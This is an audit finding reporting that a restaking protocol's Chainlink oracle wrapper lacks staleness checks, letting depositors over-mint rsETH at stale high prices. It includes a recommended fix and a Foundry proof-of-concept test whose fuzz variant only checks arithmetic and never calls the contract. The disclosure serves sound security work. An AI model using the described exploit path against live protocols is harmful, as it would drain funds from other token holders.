### Title
Missing Chainlink Staleness Check Enables Over-Minting of rsETH via Stale High LST Price — (`contracts/oracles/ChainlinkPriceOracle.sol`)

---

### Summary

`ChainlinkPriceOracle.getAssetPrice()` discards all return values from `latestRoundData()` except `price`. There is no check on `updatedAt` (age of the answer) or `answeredInRound >= roundId` (round completeness). A stale high price for any supported LST (e.g., stETH/ETH) is silently accepted and used to compute the rsETH mint amount, while `rsETHPrice` may still reflect a prior correct valuation. The resulting mismatch lets a depositor receive more rsETH than their collateral is worth in ETH, diluting all other holders and driving the protocol toward insolvency.

---

### Finding Description

**Root cause — `ChainlinkPriceOracle.getAssetPrice()`:**

```solidity
// contracts/oracles/ChainlinkPriceOracle.sol  line 52
(, int256 price,,,) = priceFeed.latestRoundData();
return uint256(price) * 1e18 / 10 ** uint256(priceFeed.decimals());
``` [1](#0-0) 

All five return values are available (`roundId`, `answer`, `startedAt`, `updatedAt`, `answeredInRound`), but only `answer` is used. Neither `updatedAt` (to bound staleness) nor `answeredInRound >= roundId` (to confirm the round completed) is checked.

**Mint calculation — `LRTDepositPool.getRsETHAmountToMint()`:**

```solidity
// contracts/LRTDepositPool.sol  line 520
rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
``` [2](#0-1) 

`lrtOracle.getAssetPrice(asset)` flows directly through `LRTOracle.getAssetPrice()` → `ChainlinkPriceOracle.getAssetPrice()` with no additional freshness gate. `lrtOracle.rsETHPrice()` is a stored value updated only when `updateRSETHPrice()` is called.

**`rsETHPrice` update — `LRTOracle._updateRsETHPrice()`:** [3](#0-2) 

`rsETHPrice` is recomputed from `_getTotalEthInProtocol()`, which also calls `getAssetPrice()` for each asset. Crucially, `rsETHPrice` is only updated when `updateRSETHPrice()` is explicitly called — it is **not** updated on every deposit.

---

### Impact Explanation

**Exploit window:** Between two consecutive `updateRSETHPrice()` calls, if the Chainlink feed for an LST becomes stale at a price higher than the true current price:

| Variable | Value |
|---|---|
| Stale Chainlink price (stETH/ETH) | 1.05e18 |
| True market price (stETH/ETH) | 0.99e18 |
| `rsETHPrice` (last correct update) | 1.00e18 |
| Attacker deposits | 100 stETH |
| rsETH minted | `100 * 1.05e18 / 1.00e18 = 105 rsETH` |
| True ETH value deposited | `100 * 0.99 = 99 ETH` |
| rsETH over-minted | 6 rsETH (worth ~6 ETH at corrected price) |

When `updateRSETHPrice()` is next called with the corrected price, `_getTotalEthInProtocol()` returns a lower value, `rsETHPrice` drops, and the attacker's 105 rsETH represents a claim on more ETH than the 99 ETH they deposited. The shortfall is borne by all other rsETH holders — **protocol insolvency**.

The downside-protection pause in `_updateRsETHPrice()` (lines 270–281) triggers only *after* the price corrects, by which point the over-minting has already occurred and the attacker holds the excess rsETH. [4](#0-3) 

---

### Likelihood Explanation

Chainlink feeds have defined heartbeat intervals (e.g., 24 h for stETH/ETH on mainnet) and deviation thresholds. During periods of rapid LST depeg (e.g., a slashing event, a withdrawal queue freeze, or a secondary-market sell-off), the on-chain feed can lag the true price for minutes to hours — well within a realistic attack window. No privileged access, governance capture, or oracle operator compromise is required; the attacker only needs to call the public `depositAsset()` function while the feed is stale.

---

### Recommendation

Add staleness and round-completeness checks in `ChainlinkPriceOracle.getAssetPrice()`:

```solidity
uint256 public constant STALENESS_THRESHOLD = 25 hours; // tune per feed heartbeat

function getAssetPrice(address asset) external view onlySupportedAsset(asset) returns (uint256) {
    AggregatorV3Interface priceFeed = AggregatorV3Interface(assetPriceFeed[asset]);

    (uint80 roundId, int256 price,, uint256 updatedAt, uint80 answeredInRound) =
        priceFeed.latestRoundData();

    if (price <= 0) revert InvalidPrice();
    if (answeredInRound < roundId) revert StalePrice();
    if (block.timestamp - updatedAt > STALENESS_THRESHOLD) revert StalePrice();

    return uint256(price) * 1e18 / 10 ** uint256(priceFeed.decimals());
}
```

Per-feed thresholds (stored in a mapping) are preferable because different assets have different heartbeat intervals.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

// Foundry fork test — run against a local fork or Anvil snapshot
// forge test --match-test testStalePriceOverMint -vvv

import "forge-std/Test.sol";

interface IChainlinkPriceOracle {
    function getAssetPrice(address asset) external view returns (uint256);
}

interface ILRTDepositPool {
    function depositAsset(address, uint256, uint256, string calldata) external;
    function getRsETHAmountToMint(address, uint256) external view returns (uint256);
}

interface ILRTOracle {
    function rsETHPrice() external view returns (uint256);
    function updateRSETHPrice() external;
}

contract StalePricePoC is Test {
    // Replace with actual deployed addresses on fork
    address constant DEPOSIT_POOL  = address(0xDEAD1);
    address constant LRT_ORACLE    = address(0xDEAD2);
    address constant STETH         = address(0xDEAD3);
    address constant CHAINLINK_FEED = address(0xDEAD4);

    function testStalePriceOverMint() external {
        // 1. Snapshot rsETHPrice when stETH/ETH was ~1.00e18
        uint256 rsETHPriceBefore = ILRTOracle(LRT_ORACLE).rsETHPrice();
        assertApproxEqRel(rsETHPriceBefore, 1e18, 0.01e18, "baseline rsETHPrice");

        // 2. Warp time so Chainlink feed is stale (last answer = 1.05e18, true = 0.99e18)
        //    In a real fork: manipulate the mock aggregator to return 1.05e18 without
        //    updating `updatedAt`, simulating a stale feed.
        vm.mockCall(
            CHAINLINK_FEED,
            abi.encodeWithSignature("latestRoundData()"),
            abi.encode(uint80(10), int256(1.05e8), uint256(0), block.timestamp - 26 hours, uint80(9))
            //                                                  ^^^ stale: 26 h ago, answeredInRound < roundId
        );

        // 3. Compute rsETH to mint for 100 stETH at stale price
        uint256 depositAmount = 100e18;
        uint256 rsethMinted = ILRTDepositPool(DEPOSIT_POOL)
            .getRsETHAmountToMint(STETH, depositAmount);

        // Expected with stale price: 100 * 1.05e18 / 1.00e18 = 105e18
        assertApproxEqRel(rsethMinted, 105e18, 0.001e18, "over-minted rsETH");

        // 4. True ETH value of deposit at corrected price (0.99e18)
        uint256 trueETHValue = depositAmount * 0.99e18 / 1e18; // 99 ETH

        // 5. rsETH value at corrected rsETHPrice (after updateRSETHPrice with true price)
        //    rsETHPrice will drop; attacker's rsETH claim > trueETHValue
        uint256 attackerClaimETH = rsethMinted * rsETHPriceBefore / 1e18; // 105 ETH at old price

        // Assert: attacker extracted more ETH than deposited
        assertGt(attackerClaimETH, trueETHValue, "attacker profit: protocol insolvent");

        // 6. Collateral ratio < 1.0 after correction
        // (totalETH_true) / (rsethSupply * rsETHPrice_corrected) < 1
        // Demonstrated by the 6 ETH shortfall per 100 stETH deposited
        emit log_named_uint("Over-minted rsETH (wei)", rsethMinted - 100e18);
        emit log_named_uint("ETH shortfall (wei)",     attackerClaimETH - trueETHValue);
    }
}
```

**Fuzz variant** (assert over `stalePriceHigh` in [1.01e18, 1.10e18]):

```solidity
function testFuzz_stalePriceOverMint(uint256 stalePriceHigh) external {
    stalePriceHigh = bound(stalePriceHigh, 1.01e18, 1.10e18);
    uint256 truePrice = 0.99e18;
    uint256 rsETHPrice = 1.00e18;
    uint256 deposit = 100e18;

    uint256 minted = deposit * stalePriceHigh / rsETHPrice;
    uint256 trueValue = deposit * truePrice / 1e18;

    // Invariant: minted rsETH value at corrected price must not exceed deposit value
    // This ALWAYS fails when stalePriceHigh > truePrice and rsETHPrice >= truePrice
    assertLe(minted, trueValue, "collateral ratio breach");
}
```

The fuzz test will fail for every value of `stalePriceHigh` in the given range, confirming the invariant is broken by the missing staleness check.

### Citations

**File:** contracts/oracles/ChainlinkPriceOracle.sol (L52-54)
```text
        (, int256 price,,,) = priceFeed.latestRoundData();

        return uint256(price) * 1e18 / 10 ** uint256(priceFeed.decimals());
```

**File:** contracts/LRTDepositPool.sol (L519-521)
```text
        // calculate rseth amount to mint based on asset amount and asset exchange rate
        rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
    }
```

**File:** contracts/LRTOracle.sol (L214-251)
```text
    function _updateRsETHPrice() internal {
        address rsETHTokenAddress = lrtConfig.rsETH();
        uint256 rsethSupply = IRSETH(rsETHTokenAddress).totalSupply();

        if (rsethSupply == 0) {
            rsETHPrice = 1 ether;
            highestRsethPrice = 1 ether;
            return;
        }

        if (highestRsethPrice == 0) {
            highestRsethPrice = rsETHPrice;
        }

        uint256 previousPrice = rsETHPrice;

        // get total ETH in the protocol (normalized to 1e18)
        uint256 totalETHInProtocol = _getTotalEthInProtocol();

        // calculate previousTVL using rsethSupply multiplied by rsETHPrice
        uint256 previousTVL = rsethSupply.mulWad(rsETHPrice);

        IPausable lrtDepositPool = IPausable(lrtConfig.getContract(LRTConstants.LRT_DEPOSIT_POOL));
        IPausable withdrawalManager = IPausable(lrtConfig.getContract(LRTConstants.LRT_WITHDRAW_MANAGER));

        // determine if the protocol is active (not paused)
        bool protocolPaused = lrtDepositPool.paused() || withdrawalManager.paused() || paused;

        // only take fee if TVL increased and protocol is not paused
        uint256 protocolFeeInETH = 0;
        if (!protocolPaused && totalETHInProtocol > previousTVL) {
            uint256 rewardAmount = totalETHInProtocol - previousTVL;
            protocolFeeInETH = (rewardAmount * lrtConfig.protocolFeeInBPS()) / 10_000;
        }

        // compute new rsETH price based on total ETH minus fee
        uint256 newRsETHPrice = (totalETHInProtocol - protocolFeeInETH).divWad(rsethSupply);

```

**File:** contracts/LRTOracle.sol (L270-281)
```text
        if (newRsETHPrice < highestRsethPrice) {
            uint256 diff = highestRsethPrice - newRsETHPrice;
            // normalizing to 1e18
            bool isPriceDecreaseOffLimit =
                pricePercentageLimit > 0 && diff > pricePercentageLimit.mulWad(highestRsethPrice);

            // if price decrease is off limit, pause the protocol (unless it's already paused)
            if (isPriceDecreaseOffLimit) {
                if (!lrtDepositPool.paused()) lrtDepositPool.pause();
                if (!withdrawalManager.paused()) withdrawalManager.pause();
                _pause();
                return;
```
